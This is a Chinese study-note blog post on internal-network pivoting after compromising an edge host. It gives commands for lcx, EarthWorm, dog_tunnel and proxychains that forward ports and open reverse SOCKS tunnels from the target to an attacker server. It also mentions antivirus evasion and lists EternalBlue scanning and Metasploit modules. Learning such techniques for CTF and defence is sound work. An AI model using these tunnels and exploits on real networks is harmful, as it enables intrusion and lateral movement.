---
layout:     post
title:      权限提升&内网渗透（三）内网流量转发
subtitle:   这个系列是整理学习安全的笔记，记录一些学习到的提权和内网渗透的知识。本章是内网端口流量转发，包含一些常见工具的使用方法说明，主要是方便以后用到查看。
date:       2021-01-18
author:     K4ys0n
header-img: img/post-bg-art.jpg
catalog:    true
tags:
    - CTF
    - Linux
    - 网络安全
    - 学习笔记
    - 漏洞利用
    - 内网渗透
    - 端口转发
    - 工具
---



## 0x00 为什么要转发内网流量

在拿到边界机器后，对内网进行了扫描和探测，但是这一切都是在边界机中操作，时间长会被发现，而且一些漏洞攻击程序必须依靠内网流量。

内网设备的一些流量交互只限制了内网使用，外网无法可能访问或者会被防火墙拦截，这时候就需要在边缘设备上做端口转发，将内网通信端口转发到外网可访问的端口上来，这样就可以与内网设备做交互了。



## 0x01 端口转发

#### 1. 当边界主机可以开放端口时

```shell
./lcx -tran [外网端口] [内网IP] [内网端口]
./lcx -tran 3389 192.168.11.1 3389
```

在边界机开启一个端口，并把流量转发到目标IP的端口。

任何主机访问边界机的3389端口，就相当于访问192.168.11.1的3389端口。

#### 2. 当边界主机无法开放端口时

就无法使用lcx直接转发端口了，这时就需要ew做端口代理，由攻击机主动连接。

在公网主机（IP为10.10.10.10）或者自己电脑起一个ew监听代理：

```shell
./ew -s lcx_listen -l [随便设置代理端口] -e [靶机来连接的端口] 
./ew -s lcx_listen -l 12345 -e 8001
```

在边缘设备（目标靶机）上用ew反弹连接自己的主机：

```shell
./ew -s lcx_slave -d [公网主机的ip] -e [公网主机的端口] -f [内网ip] -g [内网端口]
./ew -s lcx_slave -d 10.10.10.10 -e 8001 -f 127.0.0.1 -g 8080
```

这样就相当于目标靶机主动连接到公网主机，并将其监听的8080端口，通过反弹到公网主机（10.10.10.10:8001），然后再由公网主机转发到12345端口上，可供我们访问或连接。

任何主机访问10.10.10.10的12345端口就相当于访问靶机的127.0.0.1:8080。

#### 3. 举个例子（redis服务）

当靶机有某个服务如redis服务（127.0.0.1:6379）在端口转发后仍无法访问时，此时可能是有公网云防火墙或者目标主机开启了防火墙只允许80或443，（此时直接`lcx -tran 8000 127.0.0.1 6379`正向转发成功，但无法访问，因为不是80或443），这时需要一个公网服务器（如：同为阿里云的云服务器）来打通通道，也就是公网服务器作为中间人，先把redis服务转发到靶机某个端口，再转到公网服务器，再转到本地。

- redis是开启127.0.0.1:6379本地监听（所以无法访问）
- 靶机端口转发

```shell
lcx -slave 47.240.x.x 443 127.0.0.1 6379
```

其中47.240.x.x是指公网服务器的IP。

- 公网服务器监听

```shell
lcx -listen 443 9000
```

监听443，转发到9000端口。

- 本地连接公网服务器的9000端口即可。



## 0x02 代理

#### 1. 代理工具ew

- 当边界主机可以开放端口时（此时使用正向代理）

```shell
./ew -s ssocksd -l 8888
```


直接在边界主机中开放一个打击端口，然后在浏览器设置连接代理（ssocks，127.0.0.1:8888），接下来访问链接就会经过这个代理。

- 当边界主机无法开放端口时（此时使用反向代理）

在公网主机或者自己电脑监听代理：

```shell
./ew -s rcsocks -l 8888 -e 8001
```

在边界主机主动链接到公网主机：

```shell
./ew -s rssocks -d 10.10.10.10 -e 8001
```

接下来在浏览器设置连接代理（ssocks，127.0.0.1:8888）即可。

#### 2. 代理工具dog_tunnel（狗洞）

- 简介

> 狗洞可以建立稳定的代理。
>
> 狗洞是一个高速的 P2P 端口映射工具，同时支持Socks5代理。同时提供非P2P版本，即Lite版，两端连接过程完全不依赖中间服务器，支持加密和登陆认证，自动重连，但是需要人为确保两端能正常连通（否则需使用默认的P2P版本）。

- lite版说明

> - dtunnel_lite 分为近端和远端，dtunnel_lite 最基本的三个参数：
>
> ```shell
> -service, -local, -action
> ```
>
> 其中`-service` 是两端必须指定的，指向地址（ip:port）需要一致，远端监听，近端连接，远端可选择省略ip（例如`-action :8008`）, 省略ip时会监听系统所有网卡上的指定端口，但是连接端必须指定对应ip连接。
>
> - 如何区分远端近端?
>
> 带`-local`参数的即为近端，不带即为远端（服务端）。
>
> `-local` 代表近端连接远端成功后，本地需要监听什么端口，比如做端口映射，`-local :8888`代表本地监听8888端口，你连接本地的8888端口即连接到了被映射的远端端口了。
>
> `-action` 是代表近端连接远端后`-local`端口具体的行为，这个行为可以是端口映射（tcp或者udp）、socks5代理（或者socks5_smart模式）、 route（route_smart）模式，该参数一般由近端指定，远端指定的话，会强制近端使用远端
> 的策略，这个参数的默认值客户端为socks5，服务端为空。
>
> - 详见链接说明
>
> [https://github.com/vzex/dog-tunnel/blob/udpVersion/HowToUse.txt](https://github.com/vzex/dog-tunnel/blob/udpVersion/HowToUse.txt)
>
> - 设置代理
>
> > 边界机（10.10.10.10）执行：
> > 
> > ```shell
> > ./dtunnel_lite -service 0.0.0.0:8001
> > ```
> > 
> > 注意Linux系统端口转发不需要sudo。
>
> > 自己电脑（22.22.22.22）：
> > 
> > ```shell
> > sudo ./dtunnel_lite -service 10.10.10.10:8001 -action socks5 -local :8888
> > ```
> > 
> > 代理地址就是 `socks5://127.0.0.1:8888`
>
> - 设置端口转发
>
> >  自己电脑端口转发：
> >
> >  ```shell
> >  ./dtunnel_lite -service 10.10.10.10:8001 -action 22.22.22.22:6379 -local :6379
> >  ```
> >
> >  访问`127.0.0.1:6379` 就相当于访问内网的`22.22.22.22:6379`，然后`telnet 127.0.0.1:6379`即可，或者用redis-cli.exe客户端
> >
> - 狗洞下载地址
> 
> [https://github.com/vzex/dog-tunnel/tree/udpVersion](https://github.com/vzex/dog-tunnel/tree/udpVersion)

#### 3. 代理连接工具

本地需要装一个代理工具：
- 浏览器可以用[switchyomega](https://github.com/FelisCatus/SwitchyOmega/releases)
- windows下系统代理工具[proxifier](https://www.proxifier.com/download/)
- Linux下系统代理[proxychains-ng](https://github.com/rofl0r/proxychains-ng/releases/tag/v4.14)
> 
> github下载或者`sudo apt install proxychains4 -y`
> 
> 使用方法：
> 
> ```shell
> proxychains4 -q sqlmap -u xxx
> ```
> 
> 即在执行命令之前加一个`proxychains4 -q`，`-q`参数作用是不输出proxychains4的输出，不然每输出一行都会带一行代理的信息。
> 
> 在/etc/proxychains.conf进行配置，在其最后一行写一行：
> 
> ```
> socks5 [ip] [端口]
> # 例如：
> socks5 172.16.12.2 8000
> ```



## 0x03 Linux下lcx.c源码编译
Makefile文件：

```makefile
ifdef ANONYMOUS
    DFLAG=-DANONYMOUS
endif
all : lcx.c
    cc lcx.c -o lcx -pthread -02 ${DFLAG}
command : lcx.c
    cc lcx.c -o lcx -pthread -02 -DCOMMAND_MODE ${DFLAG}
clean :
    rm lcx
```

接着直接`make`即可。

如果没有make命令，可以直接用gcc：

```shell
gcc lcx.c -o lcx -pthread -02 -DANONYMOUS
```



## 0x03 Go版lcx

另一种lcx：`go-lcx.exe`

Go版lcx基本免杀，github上下载即可。[传送门](https://github.com/cw1997/NATBypass)







## 0xff 端口转发时验证永恒之蓝

在目标靶机上将内网的445端口转发到外网4445端口：

```shell
lcx 10.10.10.10:445 172.16.12.2:4445
```

用nmap验证永恒之蓝：

```shell
nmap -p 445 172.16.12.2 --script vuln-smb-ms17-010
```

常用的几个永恒之蓝：

```
use exploit/windows/smb/ms17_010_eternalblue
use exploit/windows/smb/ms17_010_psexec        win2003及以下（包括xp等），推荐
use exploit/windows/smb/ms17_010_win8
```



